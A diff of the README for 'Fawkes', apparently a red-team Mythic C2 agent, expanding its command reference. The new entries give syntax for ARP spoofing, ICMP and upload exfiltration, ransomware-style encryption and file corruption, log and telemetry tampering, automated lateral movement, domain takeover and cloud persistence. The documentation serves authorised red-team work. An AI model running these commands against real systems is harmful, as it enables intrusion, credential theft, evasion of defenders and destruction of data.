@@ -6,7 +6,7 @@ Fawkes is an entirely vibe-coded Mythic C2 agent. It started as an "I wonder" an
 
 I originally attempted to write the agent myself, but after cloning the example container, reading through mythic docs, watching the dev series youtube videos, and copying code from other agents like Merlin or Freyja, I decided I just didn't have time to develop my own agent. A prompt though, that I have time for.
 
-Fawkes is a golang based agent with cross-platform capabilities. It supports **Windows** (EXE, DLL, and shellcode payloads), **Linux** (ELF binaries and shared libraries), and **macOS** (Mach-O binaries for Intel and Apple Silicon). **212 commands** total: 112 cross-platform, 82 Windows-only, 21 Unix-only, 11 Linux-only, and 6 macOS-only (some commands have platform-specific implementations sharing one user-facing name, e.g. screenshot). Supports HTTP egress and TCP peer-to-peer (P2P) linking for internal pivoting.
+Fawkes is a golang based agent with cross-platform capabilities. It supports **Windows** (EXE, DLL, and shellcode payloads), **Linux** (ELF binaries and shared libraries), and **macOS** (Mach-O binaries for Intel and Apple Silicon). **213 commands** total: 113 cross-platform, 82 Windows-only, 21 Unix-only, 11 Linux-only, and 6 macOS-only (some commands have platform-specific implementations sharing one user-facing name, e.g. screenshot). Supports HTTP egress and TCP peer-to-peer (P2P) linking for internal pivoting.
 
 ## Installation
 To install Fawkes, you'll need Mythic installed on a remote computer. You can find installation instructions for Mythic at the [Mythic project page](https://github.com/its-a-feature/Mythic/).
@@ -22,13 +22,14 @@ From the Mythic install directory:
 Command | Syntax | Description
 ------- | ------ | -----------
 acl-edit | `acl-edit -action read -server dc01 -target user` | Read/modify Active Directory object DACLs (add/remove ACEs, grant DCSync, GenericAll, backup/restore). Cross-platform (T1222.001, T1098, T1003.006).
-adcs | `adcs -action <cas\|templates\|find\|request> -server <DC> -username <user@domain> -password <pass> [-ca_name <CA>] [-template <name>] [-alt_name <UPN>]` | Enumerate AD Certificate Services, find vulnerable templates (ESC1-ESC4, ESC6 via DCOM), and request certificates via DCOM for ESC1/ESC6 exploitation. Cross-platform (T1649).
+adcs | `adcs -action <cas\|templates\|find\|request\|auto-exploit> -server <DC> -username <user@domain> -password <pass> [-ca_name <CA>] [-template <name>] [-alt_name <UPN>]` | Enumerate AD Certificate Services, find vulnerable templates (ESC1-ESC4, ESC6 via DCOM), request certificates via DCOM for ESC1/ESC6 exploitation, or auto-exploit (find → parse → request chain). Cross-platform (T1649).
 ads | `ads -action <write\|read\|list\|delete> -file <path> [-stream <name>] [-data <content>] [-hex true]` | **(Windows only)** Manage NTFS Alternate Data Streams — write, read, list, or delete hidden data streams. Supports text and hex-encoded binary. MITRE T1564.004.
-amcache | `amcache -action <query\|search\|delete\|clear> [-name <pattern>] [-count <n>]` | **(Windows only)** Query and clean Windows Shimcache (AppCompatCache) execution history. Removes forensic evidence of tool execution (T1070.004).
+amcache | `amcache -action <query\|search\|delete\|clear> [-name <pattern>] [-count <n>]` | Query and clean forensic execution artifacts. Windows: Shimcache. Linux: recently-used.xbel, thumbnails, Tracker. macOS: recent items, KnowledgeC, quarantine (T1070.004).
 apc-injection | `apc-injection` | **(Windows only)** Perform QueueUserAPC injection into an alertable thread. Use `ts` to find alertable threads (T1055.004).
+audio-capture | `audio-capture [-duration 10] [-sample_rate 16000] [-channels 1] [-device default]` | Record audio from microphone and upload WAV file. Windows (waveIn), Linux (arecord/parecord), macOS (rec/ffmpeg). Cross-platform (T1123).
 auditpol | `auditpol -action <query\|disable\|enable\|stealth> [-category <name\|all>]` | **(Windows only)** Query and modify Windows audit policies. Disable security event logging before sensitive operations. Stealth mode disables detection-critical subcategories. Uses AuditQuerySystemPolicy API (T1562.002).
 argue | `argue -command "cmd.exe /c whoami" -spoof "cmd.exe /c echo hello"` | **(Windows only)** Execute a command with spoofed process arguments. Defeats Sysmon Event ID 1 and EDR command-line telemetry (T1564.010).
-arp | `arp [-ip <subnet>] [-mac <prefix>] [-interface <name>]` | Display ARP table with optional IP, MAC, or interface filtering. Cross-platform.
+arp | `arp [-ip <subnet>]` or `arp -action spoof -target <IP> -gateway <IP>` | Display ARP table with filtering, or ARP cache poisoning for MITM positioning (T1557.002). Spoof: Linux only, restores on cleanup.
 asrep-roast | `asrep-roast -server <DC> -username <user@domain> -password <pass> [-account <target>]` | Request AS-REP tickets for accounts without pre-authentication and extract hashes in hashcat format for offline cracking. Auto-enumerates via LDAP. Cross-platform (T1558.004).
 av-detect | `av-detect [-deep true]` | Detect installed AV/EDR/security products by scanning running processes against a 130+ signature database. With `--deep`, also checks kernel modules, systemd units, and config directories for installed-but-not-running products (Linux). Reports product, vendor, type, and PID. Cross-platform.
 autopatch | `autopatch <dll_name> <function_name> <num_bytes>` | **(Windows only)** Automatically patch a function by jumping to nearest return (C3) instruction. Useful for AMSI/ETW bypasses.
@@ -42,25 +43,25 @@ chown | `chown -path <file> -owner <user> [-group <group>] [-recursive true]` | 
 cert-check | `cert-check -host <hostname> [-port 443] [-timeout 10]` | Inspect TLS certificates on remote hosts — identifies CAs, self-signed certs, expiry, SANs, TLS version, cipher suites, and SHA256 fingerprints. Cross-platform (T1590.001).
 certstore | `certstore -action <list\|find> [-store <MY\|ROOT\|CA\|Trust\|TrustedPeople>] [-filter <substring>]` | **(Windows only)** Enumerate Windows certificate stores to find code signing certs, client auth certs, and private keys. Searches CurrentUser and LocalMachine. MITRE T1552.004, T1649.
 clipboard | `clipboard -action <read\|write\|monitor\|dump\|stop> [-data "text"] [-interval 3]` | Read/write clipboard or continuously monitor for changes with credential pattern detection. Cross-platform (T1115).
-cloud-metadata | `cloud-metadata -action <detect\|all\|creds\|identity\|userdata\|network> [-provider <auto\|aws\|azure\|gcp\|digitalocean>] [-timeout 3]` | Probe cloud instance metadata services for IAM credentials, identity, user-data, and network config. Auto-detects provider. AWS IMDSv2 support. Cross-platform (T1552.005, T1580).
-compress | `compress -action <create\|list\|extract> -path <path> [-output <out>] [-pattern *.txt]` | Create, list, or extract zip archives for data staging and exfiltration. Pattern filter, depth/size limits. Cross-platform (T1560.001).
+cloud-metadata | `cloud-metadata -action <detect\|creds\|aws-iam\|azure-graph\|gcp-iam\|aws-persist\|azure-persist\|...> [-provider <auto\|aws\|azure\|gcp\|do>]` | Cloud metadata, credential extraction, IAM enumeration, and persistence. aws-persist creates IAM access keys; azure-persist creates app registrations. Auto-detect. IMDSv2. Cross-platform (T1552.005, T1580, T1098.001).
+compress | `compress -action <create\|list\|extract\|stage\|exfil\|stage-exfil> -path <path> [-format zip\|tar.gz] [-output <out>] [-pattern *.txt] [-cleanup true]` | Create, list, extract, stage, or exfil archives. Stage encrypts with AES-256-GCM. Exfil transfers to Mythic with SHA-256 integrity. Stage-exfil combines both in one step. Cross-platform (T1560.001, T1074.001, T1041, T1048).
 coerce | `coerce -server <target> -listener <attacker-ip> [-method petitpotam\|printerbug\|shadowcoerce\|all] -username <user> [-password <pass>] [-hash <NT hash>] [-domain <domain>]` | NTLM authentication coercion via MS-EFSR (PetitPotam), MS-RPRN (PrinterBug), MS-FSRVP (ShadowCoerce). Forces target to authenticate to attacker listener. Pass-the-hash support. Cross-platform (T1187).
 config | `config [-action show\|set] [-key sleep\|jitter\|killdate\|working_hours_start\|working_hours_end\|working_days] [-value <val>]` | View or modify runtime agent configuration — sleep, jitter, kill date, working hours. Cross-platform.
 container-detect | `container-detect` | Detect container runtime and environment (Docker, K8s, LXC, Podman, WSL). Checks escape vectors like Docker sockets and K8s service accounts. Cross-platform (T1082, T1497.001).
 container-escape | `container-escape -action <check\|docker-sock\|cgroup\|nsenter\|mount-host> [-command '<cmd>']` | **(Linux only)** Container breakout — Docker socket abuse, cgroup release_agent, PID namespace nsenter, host device mount. Enumerate or exploit escape vectors (T1611).
 cp | `cp <source> <destination>` | Copy a file from source to destination.
-cred-check | `cred-check -hosts <IPs/CIDRs> -username <DOMAIN\user> -password <pass> [-hash <NTLM>] [-timeout <seconds>]` | Test credentials against SMB, WinRM, and LDAP on target hosts. Validates authentication across protocols in parallel with PTH support. Cross-platform (T1110.001, T1078).
-cred-harvest | `cred-harvest -action <shadow\|cloud\|configs\|history\|windows\|m365-tokens\|all> [-user <username>]` | Harvest credentials: shadow hashes (Unix), cloud configs (AWS/GCP/Azure/K8s), application secrets, shell history scanning for leaked passwords/tokens/API keys, PowerShell history + env vars + RDP (Windows), M365 OAuth/JWT tokens from TokenBroker/Teams/Outlook (Windows). Cross-platform (T1552, T1003.008, T1528).
+cred-check | `cred-check [-action check\|verify-all] -hosts <IPs/CIDRs> -username <DOMAIN\user> -password <pass> [-hash <NTLM>] [-timeout <seconds>]` | Test credentials against SMB, WinRM, and LDAP on target hosts. `verify-all` tests all vault credentials against discovered hosts in parallel. Cross-platform (T1110.001, T1078).
+cred-harvest | `cred-harvest -action <shadow\|cloud\|configs\|history\|windows\|m365-tokens\|all\|dump-all> [-user <username>]` | Harvest credentials: shadow hashes (Unix), cloud configs (AWS/GCP/Azure/K8s), application secrets, shell history scanning for leaked passwords/tokens/API keys, PowerShell history + env vars + RDP (Windows), M365 OAuth/JWT tokens from TokenBroker/Teams/Outlook (Windows). **dump-all**: automated subtask chain — runs hashdump + lsa-secrets + cred-harvest all in parallel (Windows). Cross-platform (T1552, T1003.008, T1528).
 credential-prompt | `credential-prompt [-title "Authentication Required"] [-message "Enter your credentials..."] [-icon caution]` | Display native credential dialog to capture user credentials. macOS: AppleScript dialog with custom icon. Windows: CredUI prompt (domain/user/password). Linux: zenity/kdialog/yad. Reports to Mythic credential vault (T1056.002).
-curl | `curl -url <URL> [-method GET\|POST\|PUT\|DELETE\|HEAD\|OPTIONS\|PATCH] [-headers '{"K":"V"}'] [-body <data>] [-output full\|body\|headers]` | Make HTTP/HTTPS requests from agent's network. Cloud metadata, internal services, SSRF. Cross-platform (T1106).
+curl | `curl -url <URL> [-method GET\|PUT\|POST] [-file <path>] [-upload raw\|multipart] [-headers '{"K":"V"}'] [-body <data>]` | HTTP requests + file upload exfiltration (T1567). Upload to S3 presigned URLs, Azure SAS, generic endpoints. Cross-platform (T1106, T1567.002).
 cut | `cut -path <file> -delimiter <char> -fields <1,3\|1-3\|2-> [-chars <1-10>]` | Extract fields or character ranges from file lines. Custom delimiters, range specs. Cross-platform (T1083).
 credman | `credman [-action <list\|dump>] [-filter <pattern>]` | **(Windows only)** Enumerate Windows Credential Manager entries. `list` shows metadata, `dump` reveals passwords. MITRE T1555.004.
 defender | `defender -action <status\|exclusions\|add-exclusion\|remove-exclusion\|threats\|enable\|disable> [-type <path\|process\|extension>] [-value <val>]` | **(Windows only)** Manage Defender — status, exclusions, threats, enable/disable real-time protection. MITRE T1562.001.
 dpapi | `dpapi -action <decrypt\|masterkeys\|chrome-key> [-blob <base64>] [-entropy <base64>]` | **(Windows only)** DPAPI blob decryption (CryptUnprotectData), master key enumeration, Chrome/Edge encryption key extraction. MITRE T1555.003/T1555.005.
 email | `email -action <count\|search\|read\|folders> [-folder <name>] [-query <keyword>] [-index <n>]` | **(Windows only)** Access Outlook mailbox via COM. Count messages, search by keyword, read by index, list folders. MITRE T1114.001.
-dcom | `dcom -action exec -host <target> -command <cmd> [-args <arguments>] [-object mmc20\|shellwindows\|shellbrowser]` | **(Windows only)** Execute commands on remote hosts via DCOM lateral movement. Three objects: MMC20.Application, ShellWindows, ShellBrowserWindow. MITRE T1021.003.
+dcom | `dcom -action exec -host <target> -command <cmd> [-args <arguments>] [-object mmc20\|shellwindows\|shellbrowser\|wscript\|excel\|outlook]` | **(Windows only)** Execute commands on remote hosts via DCOM lateral movement. Six objects: MMC20.Application, ShellWindows, ShellBrowserWindow, WScript.Shell (Run), Excel.Application (RegisterXLL/DDEInitiate), Outlook.Application (CreateObject Shell). MITRE T1021.003.
 debug-detect | `debug-detect` | Detect attached debuggers, analysis tools, and instrumentation. Windows: IsDebuggerPresent, NtQueryInformationProcess, PEB, DR registers. Linux: TracerPid, LD_PRELOAD, memory maps (Frida/Valgrind/sanitizers), VM/sandbox, eBPF monitoring (Falco/Tetragon/Tracee), auditd framework, ptrace scope. macOS: sysctl P_TRACED, DYLD_INSERT_LIBRARIES, VM detection (sysctl), security products (EDR/AV), sandbox/analysis env. All: debugger process scan (T1497.001).
-dcsync | `dcsync -server <DC> -username <user> [-password <pass>] [-hash <NT hash>] -target <account[,account2]>` | DCSync — replicate AD credentials via DRS without touching LSASS. Extracts NTLM hashes, Kerberos keys (AES256/AES128). Supports pass-the-hash. Cross-platform (T1003.006).
+dcsync | `dcsync [-action sync\|domain-takeover] -server <DC> -username <user> [-password <pass>] [-hash <NT hash>] [-target <account[,account2]>]` | DCSync — replicate AD credentials via DRS without touching LSASS. `domain-takeover` runs kerberoast + asrep-roast + dcsync krbtgt/Administrator in parallel. Cross-platform (T1003.006).
 df | `df [-filesystem <device>] [-mount_point <path>] [-fstype <type>]` | Report filesystem disk space usage with optional device, mount point, or fstype filtering. Cross-platform (T1082).
 diff | `diff -file1 <path> -file2 <path> [-context <n>]` | Compare two files and show differences in unified diff format. LCS-based algorithm with configurable context lines. Cross-platform (T1083).
 dns | `dns -action <resolve\|reverse\|srv\|mx\|ns\|txt\|cname\|all\|dc\|zone-transfer\|wildcard> -target <host> [-server <dns_ip>]` | DNS enumeration — resolve hosts, query records, discover DCs, zone transfers, wildcard detection. Cross-platform (T1018).
@@ -71,10 +72,10 @@ crontab | `crontab -action <list\|add\|remove> [-entry <cron_line>] [-program <p
 download | `download <path>` | Download a file or directory from the target. Directories are auto-zipped and downloaded as `.zip`. Chunked transfer, file browser integration.
 drives | `drives` | List available drives/volumes and mounted filesystems with type, label/device, and free/total space.
 enum-tokens | `enum-tokens [-action list\|unique] [-user <filter>]` | **(Windows only)** Enumerate access tokens across all processes. `list` shows PID/user/integrity/session for each process. `unique` groups by user with process counts. Auto-enables SeDebugPrivilege (T1134, T1057).
-encrypt | `encrypt -action <encrypt\|decrypt> -path <file> [-output <out>] [-key <base64key>]` | AES-256-GCM file encryption/decryption for secure data staging. Auto-generates key or accepts provided key. Cross-platform (T1560.001).
+encrypt | `encrypt -action <encrypt\|decrypt\|encrypt-files\|decrypt-files\|corrupt\|corrupt-files> -path <file_or_glob> [-key <base64key>] [-confirm SIMULATE\|CORRUPT]` | AES-256-GCM encryption/decryption (T1486) + targeted file corruption (T1565). corrupt: overwrite file headers with random data. Safety gates required for destructive ops.
 env | `env [-action <list\|get\|set\|unset>] [-name <VAR>] [-value <val>] [-filter <pattern>]` | List, get, set, or unset environment variables for the agent process. Changes are inherited by child processes. Cross-platform.
 env-scan | `env-scan [-pid <PID>] [-filter <pattern>]` | Scan process environment variables for leaked credentials, API keys, and secrets. 35+ detection patterns across cloud, database, CI/CD, and crypto categories. Linux + macOS (T1057, T1552.001).
-etw | `etw -action <sessions\|providers\|stop\|blind\|query\|enable> [-session_name <name>] [-provider <guid\|shorthand>]` | **(Windows only)** Enumerate, stop, blind, query, or re-enable ETW trace sessions and providers. `blind` disables a provider; `enable` restores it; `query` shows session details. Shorthands: sysmon, amsi, powershell, dotnet, winrm, kernel-process, etc. (T1082, T1562.002, T1562.006).
+etw | `etw -action <sessions\|rules\|agents\|...> [-session_name <name>] [-provider <guid\|shorthand>]` | **(Windows, Linux, macOS)** Audit/telemetry subsystem manipulation. Windows: ETW sessions/providers stop/blind/enable. Linux: auditd rules, journald clear/rotate, syslog config, SIEM agent detection. macOS: unified logging, security agent detection. (T1562, T1070.002).
 eventlog | `eventlog -action <list\|query\|clear\|info\|enable\|disable> [-channel <name\|unit\|subsystem\|path>] [-event_id <id>] [-filter <xpath\|keyword\|timewindow>] [-count <max>]` | Manage system event logs. Windows: wevtapi.dll channels. Linux: journald units and syslog files. macOS: Unified Logging (os_log) subsystems/processes. List sources, query events, clear/vacuum logs, get info. MITRE T1070.001, T1562.002.
 execute-memory | `execute-memory -arguments 'arg1 arg2' -timeout 60` | Execute a native binary from memory. Linux: memfd_create (no disk write). macOS: temp file with ad-hoc codesign. Windows: temp file with immediate cleanup. All platforms remove artifacts after execution. MITRE T1620.
 execute-shellcode | `execute-shellcode` | **(Windows only)** Execute shellcode in the current process via VirtualAlloc + CreateThread. No cross-process injection — runs in a new thread within the agent (T1059.006).
@@ -82,10 +83,10 @@ exit | `exit` | Task agent to exit.
 file-attr | `file-attr -path <file> [-attrs "+hidden,-readonly,+immutable"]` | Get or set file attributes — hidden, readonly, system (Windows); immutable, append, nodump (Linux); hidden, immutable (macOS). Omit -attrs to view current flags. Cross-platform (T1564.001, T1222).
 file-type | `file-type -path <file_or_dir> [-recursive true] [-max_files 100]` | Identify file types by magic bytes (35+ signatures). Single file or directory scanning. Detects executables, archives, documents, images, databases, media, and more. Cross-platform (T1083).
 find | `find -pattern <glob> [-path <dir>] [-min_size <bytes>] [-max_size <bytes>] [-newer <min>] [-older <min>] [-type f\|d] [-perm suid\|sgid\|writable\|executable\|<octal>] [-owner <user\|uid>]` | Search for files by name, size, date, permissions, or owner. Find SUID binaries, world-writable files, files owned by specific users. Cross-platform (T1083).
-find-admin | `find-admin -hosts <targets> -username <user> -password <pass> [-method smb\|winrm\|both] [-hash <NT>]` | Sweep hosts to discover where credentials have admin access via SMB (C$ share) and/or WinRM. Supports CIDR, IP ranges, PTH, parallel scanning (T1021.002, T1021.006).
+find-admin | `find-admin -hosts <targets> -username <user> -password <pass> [-method smb\|winrm\|both] [-hash <NT>] [-action scan\|auto-move] [-lateral_method psexec\|wmi] [-lateral_command <cmd>]` | Sweep hosts to discover where credentials have admin access via SMB (C$ share) and/or WinRM. **auto-move**: automated subtask chain — find admin hosts then laterally move to each via psexec/wmi. Supports CIDR, IP ranges, PTH, parallel scanning (T1021.002, T1021.006).
 firewall | `firewall -action <list\|add\|delete\|enable\|disable\|status> [-name <rule>] [-direction <in\|out>] [-protocol <tcp\|udp\|any>] [-port <port>]` | **(Windows, macOS, Linux)** Manage firewall rules. Windows: COM API. macOS: ALF + pf. Linux: iptables/nftables (auto-detected) with list/add/delete/status. MITRE T1562.004.
 getprivs | `getprivs -action list\|enable\|disable\|strip [-privilege <name>]` | **(Windows, macOS, Linux)** List privileges/capabilities. Windows: token privileges with enable/disable/strip. Linux: process capabilities (CapEff/CapPrm) + SELinux/AppArmor context. macOS: entitlements, sandbox, groups (T1134.002).
-getsystem | `getsystem [-technique steal]` | **(Windows only)** Elevate to SYSTEM by stealing a token from a SYSTEM process (winlogon.exe). Requires admin/SeDebugPrivilege (T1134.001).
+getsystem | `getsystem [-technique steal\|potato\|check\|sudo\|osascript]` | **(Windows, Linux, macOS)** Privilege escalation. Windows: SYSTEM via token steal or DCOM potato. Linux: check escalation vectors (SUID, sudo, capabilities, docker) or attempt sudo elevation. macOS: check vectors, sudo, or osascript admin prompt (T1134, T1548).
 gpp-password | `gpp-password -server <DC> -username <user@domain> -password <pass>` | Search SYSVOL for GPP XML files with encrypted cpassword attributes and decrypt using the published AES key (MS14-025). Cross-platform via SMB (T1552.006).
 gpo | `gpo -action <list\|links\|find\|all> -server <DC> -username <user@domain> -password <pass> [-filter <name>]` | Enumerate Group Policy Objects via LDAP — list GPOs, map links with enforcement, find interesting CSE settings. Cross-platform (T1615).
 grep | `grep -pattern <regex> [-path <dir>] [-extensions .txt,.xml] [-ignore_case] [-max_results 100]` | Search file contents for regex patterns. Recursive directory search with extension filtering, context lines, and binary file skipping. Cross-platform (T1083, T1552.001).
@@ -117,12 +118,14 @@ kill | `kill -pid <PID>` | Terminate a process by PID. Cross-platform (Windows/L
 laps | `laps -server <DC> -username <user@domain> -password <pass> [-filter <computer>]` | Read LAPS passwords from AD via LDAP. Supports LAPS v1 (ms-Mcs-AdmPwd) and Windows LAPS v2 (ms-LAPS-Password). Cross-platform (T1552.006).
 lsa-secrets | `lsa-secrets -action <dump\|cached>` | **(Windows only)** Extract LSA secrets (service passwords, DPAPI keys, machine account) and cached domain credentials (DCC2/MSCacheV2 hashcat format). Requires SYSTEM (T1003.004, T1003.005).
 launchagent | `launchagent -action <install\|remove\|list> -label <com.example.name> [-path <exe>] [-daemon true]` | **(macOS only)** Install, remove, or list LaunchAgent/LaunchDaemon persistence. Creates plist with RunAtLoad+KeepAlive.
-link | `link -host <ip> -port <port>` | Link to a TCP P2P agent for internal pivoting. Target agent must be built with TCP profile. Cross-platform (T1572).
+link | `link -host <ip> -port <port> [-connection_type tcp\|namedpipe] [-pipe_name <name>]` | Link to a P2P agent via TCP or named pipe for internal pivoting. Named pipe mode uses SMB port 445 for stealthier Windows traffic. Cross-platform TCP, Windows-only named pipe (T1572).
 ln | `ln -target <existing> -link <new> [-symbolic true] [-force true]` | Create symbolic or hard links. Symlinks can point to non-existent paths. Force mode replaces existing link. Cross-platform (T1036).
 linux-logs | `linux-logs -action <list\|read\|logins\|clear\|truncate\|shred> [-file <path>] [-search <filter>] [-lines <n>]` | **(Linux only)** List, read, clear, or tamper with Linux log files and binary login records (wtmp/btmp/utmp). Supports selective line removal and secure shredding (T1070.002).
 logonsessions | `logonsessions [-action list\|users] [-filter <name>]` | **(Windows, Linux, macOS)** Enumerate active logon sessions — users, session IDs, stations, connection state. Filter by username. Windows: WTS API. Linux: utmp parsing. macOS: utmpx parsing.
+lolbin | `lolbin -action <technique> -path <payload/code/URL> [-export <func>] [-args <extra>]` | **(Windows, Linux, macOS)** LOLBin/GTFOBin proxy execution. Windows: rundll32, msiexec, regsvcs, regasm, mshta, certutil, regsvr32, installutil, vbs. Cross-platform: python, lua, perl, ruby, node, awk. Linux: curl, wget, gcc. macOS: osascript, swift, open, curl. T1218/T1059.
 ls | `ls [path]` | List files and folders with owner/group and timestamps. File browser integration. Defaults to cwd.
-make-token | `make-token -username <user> -domain <domain> -password <pass> [-logon_type <type>]` | **(Windows only)** Create a token from credentials and impersonate it.
+make-token | `make-token -username <user> -domain <domain> -password <pass> [-action spawn -command <cmd>]` | **(Windows only)** Create a token from credentials: impersonate it, or spawn a process with it (T1134.002).
+masquerade | `masquerade -source <file> -technique <type> [-disguise <value>] [-in_place]` | File masquerading and hiding — disguise files (double ext, RtLO, space, process match) or hide from enumeration (hide/unhide). Windows: +H/+S attributes. Linux: dot-prefix. macOS: UF_HIDDEN + dot-prefix (T1036, T1564.001).
 mkdir | `mkdir <directory>` | Create a new directory (creates parent directories if needed).
 module-stomping | `module-stomping -pid <PID> [-dll_name <DLL>]` | **(Windows only)** Inject shellcode by stomping a legitimate DLL's .text section. Shellcode executes from signed DLL address space, bypassing private-memory detection (T1055.001).
 modules | `modules [-pid <PID>] [-filter <name>]` | List loaded modules/DLLs/libraries in a process with optional name filtering. Cross-platform (T1057).
@@ -132,23 +135,23 @@ mv | `mv <source> <destination>` | Move or rename a file from source to destinat
 named-pipes | `named-pipes [-filter <pattern>]` | **(Windows, Linux, macOS)** List named pipes (Windows), Unix domain sockets and FIFOs (Linux/macOS) for IPC discovery. Supports substring filtering (T1083).
 net-enum | `net-enum -action <users\|localgroups\|groupmembers\|admins\|domainusers\|domaingroups\|domaininfo\|loggedon\|sessions\|shares\|mapped> [-target <host>] [-group <name>]` | **(Windows only)** Unified Windows network enumeration via Win32 API. Users, local/domain groups, group members, logged-on users (T1033), SMB sessions (T1049), shares (T1135), mapped drives, domain info. Supports remote hosts via -target.
 net-group | `net-group -action <list\|members\|user\|privileged> -server <DC> [-group <name>] [-user <sAMAccountName>] -username <user@domain> -password <pass>` | Enumerate AD group memberships via LDAP. Recursive member resolution, user group lookup, privileged group enumeration. Cross-platform (T1069.002).
-net-user | `net-user -action <add\|delete\|info\|password\|group-add\|group-remove> -username <name> [-password <pass>] [-group <group>]` | Manage local user accounts and group membership. Windows: netapi32 API. Linux: useradd/userdel/usermod/chpasswd. macOS: dscl/dseditgroup. Cross-platform (T1136.001, T1098).
+net-user | `net-user -action <add\|delete\|info\|password\|group-add\|group-remove\|disable\|enable\|lockout> -username <name> [-password <pass>] [-group <group>]` | Manage local user accounts and group membership. Windows: netapi32 API. Linux: useradd/userdel/usermod/chpasswd. macOS: dscl/dseditgroup. Disable/enable/lockout for T1531 ransomware simulation. Cross-platform (T1136.001, T1098, T1531).
 net-stat | `net-stat [-state <LISTEN\|ESTABLISHED\|...>] [-proto <tcp\|udp>] [-port <number>] [-pid <number>]` | List active network connections and listening ports with protocol, state, PID, and process name. Supports filtering by state, protocol, port, and process ID. Cross-platform.
 ntdll-unhook | `ntdll-unhook [-action unhook\|check]` | **(Windows only)** Remove EDR inline hooks from ntdll.dll by restoring the .text section from a clean on-disk copy. `check` reports hooks without removing them (T1562.001).
 syscalls | `syscalls [-action status\|list\|init]` | **(Windows only)** Indirect syscall resolver. Parses ntdll exports to resolve Nt* syscall numbers and generates stubs that jump to ntdll's syscall;ret gadget. When active, injection commands bypass userland API hooks (T1106).
 opus-injection | `opus-injection` | **(Windows only)** Callback-based process injection. Variant 1: Ctrl-C Handler Chain. Variant 4: PEB KernelCallbackTable. [Details](research/injection-techniques.md#opus-injection)
-persist | `persist -method <registry\|startup-folder\|com-hijack\|screensaver\|ifeo\|list> -action <install\|remove>` | **(Windows only)** Install or remove persistence via registry Run keys, startup folder, COM hijacking (T1546.015), screensaver hijacking (T1546.002), or IFEO debugger (T1546.012). IFEO targets accessible from lock screen (sethc, utilman, osk).
+persist | `persist -method <method> -action <install\|remove>` | **(Windows, Linux, macOS)** Install or remove persistence. Windows: registry, startup-folder, com-hijack, screensaver, ifeo, winlogon, print-processor, accessibility. Linux: crontab, systemd, shell-profile, ssh-key. macOS: launchagent. All methods support install/remove/list (T1547.001, T1547.004, T1547.012, T1546.008, T1053.003, T1543.002, T1546.004, T1098.004).
 persist-enum | `persist-enum [-category <all\|platform-specific>]` | **(Windows, Linux, macOS)** Read-only enumeration of persistence mechanisms. Windows: registry, startup, tasks, services. Linux: cron, systemd, shell profiles, SSH keys, LD_PRELOAD, udev rules, kernel modules, motd, at jobs, D-Bus services, PAM modules, package hooks, logrotate scripts, NetworkManager dispatcher, anacron. macOS: LaunchAgents, login items, periodic scripts, auth plugins, emond, at jobs (T1547, T1546, T1053, T1543, T1556).
 password-managers | `password-managers [-depth <N>]` | Discover password manager databases and config files — KeePass (.kdbx), 1Password, Bitwarden, LastPass, Dashlane, KeePassXC. Cross-platform (T1555).
 poolparty-injection | `poolparty-injection` | **(Windows only)** Inject shellcode using PoolParty techniques that abuse Windows Thread Pool internals. All 8 variants supported. [Details](research/injection-techniques.md#poolparty-injection)
-ping | `ping -hosts <IP/CIDR/range> [-port 445] [-timeout 1000] [-threads 25]` | TCP connect host reachability check with subnet sweep. Supports CIDR, dash ranges, and comma-separated lists. Cross-platform (T1018).
+ping | `ping -hosts <IP/CIDR/range> [-port 445]` or `ping -action exfil-icmp -target <IP> -file <path>` | TCP connect host reachability (T1018) + ICMP data exfiltration via echo request payloads with XOR encoding and jitter (T1048.003, T1095).
 pipe-server | `pipe-server -action <check\|impersonate> [-name <pipe>] [-timeout 30]` | **(Windows only)** Named pipe impersonation for privilege escalation. Create pipe server, wait for privileged client connection, impersonate token. Requires SeImpersonatePrivilege (T1134.001).
 printspoofer | `printspoofer [-timeout 15]` | **(Windows only)** PrintSpoofer privilege escalation — SeImpersonate to SYSTEM via Print Spooler. Creates named pipe, triggers spooler connection via OpenPrinterW, impersonates SYSTEM token. One-step NETWORK SERVICE → SYSTEM (T1134.001).
 pkg-list | `pkg-list [-filter <substring>]` | List installed packages and software. Enumerates dpkg/rpm/apk (Linux), Homebrew/Applications (macOS), or registry Uninstall keys (Windows). Supports name filtering. Cross-platform (T1518).
 port-scan | `port-scan -hosts <IPs/CIDRs> [-ports <ports>] [-timeout <s>]` | TCP connect scan for network service discovery. Supports CIDR, IP ranges, and port ranges. Cross-platform.
 powershell | `powershell <command> [--encoded]` | **(Windows only)** Execute a PowerShell command via powershell.exe with OPSEC-hardened flags (abbreviated, randomized). Supports encoded command mode to hide args from process tree.
 prefetch | `prefetch -action <list\|parse\|delete\|clear> [-name <exe>] [-count <max>]` | **(Windows only)** Parse and manage Windows Prefetch files. List executed programs, parse run history (up to 8 timestamps), delete specific entries, or clear all. Supports MAM-compressed files (T1070.004).
-privesc-check | `privesc-check -action <all\|privileges\|services\|registry\|uac\|...>` | Privilege escalation enumeration. Windows: token privileges, unquoted services, AlwaysInstallElevated, auto-logon, UAC, unattend files. Linux: SUID/SGID, capabilities, sudo, containers, cron hijacking, NFS no_root_squash, systemd units, sudo tokens, PATH hijacking, docker group, dangerous groups, Polkit rules, modprobe hooks, ld.so.preload injection, security modules (AppArmor/SELinux). macOS: LaunchDaemons, TCC, dylib hijacking, SIP. Cross-platform (T1548, T1574.009).
+privesc-check | `privesc-check -action <all\|auto-escalate\|privileges\|services\|registry\|uac\|dll-hijack\|dll-plant\|dll-sideload\|service-registry\|...>` | Privilege escalation enumeration and exploitation. `auto-escalate`: automated subtask chain — enumerates all vectors then attempts the best available escalation (UAC bypass, token steal, or sudo). Windows: token privileges, unquoted services, AlwaysInstallElevated, auto-logon, UAC, unattend files, DLL hijack scanning (phantom DLLs, writable PATH, KnownDLLs), DLL planting with timestomping, DLL sideloading opportunities, service registry permission abuse. Linux: SUID/SGID, capabilities, sudo, containers, cron hijacking, NFS no_root_squash, systemd units, sudo tokens, PATH hijacking, docker group, dangerous groups, Polkit rules, modprobe hooks, ld.so.preload injection, security modules (AppArmor/SELinux). macOS: LaunchDaemons, TCC, dylib hijacking, SIP. Cross-platform (T1548, T1574.001, T1574.002, T1574.009, T1574.011).
 psexec | `psexec -host <target> -command <cmd> [-name <svcname>] [-cleanup <true\|false>]` | **(Windows only)** Execute commands on remote hosts via SCM service creation — PSExec-style lateral movement. MITRE T1021.002, T1569.002.
 proc-info | `proc-info -action <info\|connections\|mounts\|modules> [-pid <PID>]` | **(Linux only)** Deep /proc inspection: process details (cmdline, env, caps, cgroups, namespaces, FDs), network connections with PID resolution, mounts, kernel modules. MITRE T1057.
